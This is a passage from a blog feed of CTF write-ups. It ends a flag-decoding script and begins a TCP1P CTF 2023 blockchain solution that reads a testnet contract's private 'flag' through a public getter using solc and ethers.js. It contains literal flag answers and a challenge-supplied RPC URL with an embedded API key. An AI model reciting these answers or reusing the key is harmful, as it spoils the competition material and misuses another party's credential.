&lt;&#x2F;span&gt;&lt;span&gt;      d[&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt;(string[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;])] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;chr&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt;(string[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;7&lt;&#x2F;span&gt;&lt;span&gt;]))
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;      d[&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt;(string[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;])] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;chr&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt;(string[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;7&lt;&#x2F;span&gt;&lt;span&gt;]))
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;37&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(d[i]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;end&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;__name__ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;__main__&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# Output
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# flag{Gg_g00d_j0b_3th3r3um_1s_4w3s0m3}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Yeah Ethereum is awesome...&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>TCP1P CTF 2023</title>
        <published>2023-10-16T00:00:00+00:00</published>
        <updated>2023-10-16T00:00:00+00:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="https://themj0ln1r.github.io/writeups/tcp1pctf/"/>
        <id>https://themj0ln1r.github.io/writeups/tcp1pctf/</id>
        
        <content type="html" xml:base="https://themj0ln1r.github.io/writeups/tcp1pctf/">&lt;p&gt;Hello readers, I played TCP1P CTF alone (but not anymore). I am focused on blockchain challenges only this time and I managed to solved &lt;strong&gt;&lt;code&gt;All&lt;&#x2F;code&gt;&lt;&#x2F;strong&gt; blockchain challenges within few hours of CTF. I got many new friends and like minded people in during this CTF. I am excited to share those challenge writeups here.&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;tcp1p23&#x2F;tcp1pctf23_progress.png&quot; class=&quot;autoimg&quot;&#x2F;&gt;
&lt;h1 id=&quot;blockchain&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#blockchain&quot; aria-label=&quot;Anchor link for: blockchain&quot;&gt;Blockchain&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;h1 id=&quot;venue&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#venue&quot; aria-label=&quot;Anchor link for: venue&quot;&gt;Venue&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;strong&gt;Description :&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;text&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-text &quot;&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&lt;span&gt;Look at the Amazing Party Venue So do you wish to enter?
&lt;&#x2F;span&gt;&lt;span&gt;contract: 0x1AC90AFd478F30f2D617b3Cb76ee00Dd73A9E4d3
&lt;&#x2F;span&gt;&lt;span&gt;provider: https:&#x2F;&#x2F;eth-sepolia.g.alchemy.com&#x2F;v2&#x2F;SMfUKiFXRNaIsjRSccFuYCq8Q3QJgks8
&lt;&#x2F;span&gt;&lt;span&gt;Priv-Key: Please use your own private-key, if you need ETH for transact, You can either DM the Author, or get it by yourself at https:&#x2F;&#x2F;sepoliafaucet.com&#x2F;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Attached Files : [Venue.sol, 101.txt]
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;It is just a warmup challenge, can be simply done by loading contract on remix, but I wrote a simple &lt;code&gt;ethersJS&lt;&#x2F;code&gt; script to interact with the contract.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;101.txt&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;text&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-text &quot;&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&lt;span&gt;Feeling Confuse?
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Here&amp;#39;s how you can attempt this challenge
&lt;&#x2F;span&gt;&lt;span&gt;First thing first you need to know what the code does,
&lt;&#x2F;span&gt;&lt;span&gt;then you need to write a code using web3.js or web3.py
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Okay lets see how the contract looks like,&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;Venue.sol&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;13&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Venue{
&lt;&#x2F;span&gt;&lt;span&gt;    string private flag&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    string private message&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;constructor&lt;&#x2F;span&gt;&lt;span&gt;(string memory initialFlag&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;string memory initialMessage){
&lt;&#x2F;span&gt;&lt;span&gt;        flag &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;initialFlag&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        message &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;initialMessage&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;enterVenue&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public view returns&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;string memory&lt;&#x2F;span&gt;&lt;span&gt;){
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;flag&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;goBack&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public view returns&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;string memory&lt;&#x2F;span&gt;&lt;span&gt;){
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;message&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Okay, what we have to do here is to call the &lt;code&gt;enterVenue()&lt;&#x2F;code&gt; function which will return the flag for us.&lt;&#x2F;p&gt;
&lt;p&gt;To interact with a contract on blockchain we need few things.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;- Contract ABI
&lt;&#x2F;span&gt;&lt;span&gt;- Contract Address
&lt;&#x2F;span&gt;&lt;span&gt;- RPC URI
&lt;&#x2F;span&gt;&lt;span&gt;- Few Test ETH
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;‚úÖ We can get Test ETH from faucets&lt;&#x2F;p&gt;
&lt;p&gt;‚úÖ RPC URI is provided&lt;&#x2F;p&gt;
&lt;p&gt;‚úÖ Contract Address is available&lt;&#x2F;p&gt;
&lt;p&gt;Now lets get the ABI using &lt;code&gt;solc&lt;&#x2F;code&gt; compiler. We can get ABI using &lt;code&gt;Remix&lt;&#x2F;code&gt; too, but do it in command line.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@Linux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;venue$&lt;&#x2F;span&gt;&lt;span&gt; solc Venue.sol&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --combined-json&lt;&#x2F;span&gt;&lt;span&gt; abi
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;{&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;contracts&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;:{&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Venue.sol:Venue&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;:{&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;abi&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;:[{&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;inputs&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;:[{&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;internalType&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;string&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;name&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;initialFlag&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;type&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;string&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;,{&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;internalType&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;string&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;name&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;initialMessage&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;type&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;string&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;],&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;stateMutability&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;nonpayable&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;type&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;constructor&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;,{&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;inputs&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;:[],&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;name&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;enterVenue&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;outputs&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;:[{&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;internalType&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;string&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;name&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;type&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;string&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;],&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;stateMutability&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;view&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;type&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;function&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;,{&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;inputs&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;:[],&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;name&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;goBack&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;outputs&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;:[{&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;internalType&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;string&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;name&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;type&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;string&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;],&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;stateMutability&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;view&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;type&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;function&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;]&lt;&#x2F;span&gt;&lt;span&gt;}}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;version&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;0.8.21+commit.d9974bed.Linux.g++&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;‚úÖ We got ABI too&lt;&#x2F;p&gt;
&lt;p&gt;Lets write a simple &lt;code&gt;Ethers JS&lt;&#x2F;code&gt; script to interact with our contract.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;dotenv&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;config&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;const &lt;&#x2F;span&gt;&lt;span&gt;ethers &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;ethers&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;ADDRESS &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;0x1AC90AFd478F30f2D617b3Cb76ee00Dd73A9E4d3&amp;#39;
&lt;&#x2F;span&gt;&lt;span&gt;ABI &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;[{&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;inputs&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span&gt;[{&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;internalType&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;string&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;name&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;initialFlag&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;type&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;string&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;{&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;internalType&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;string&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span 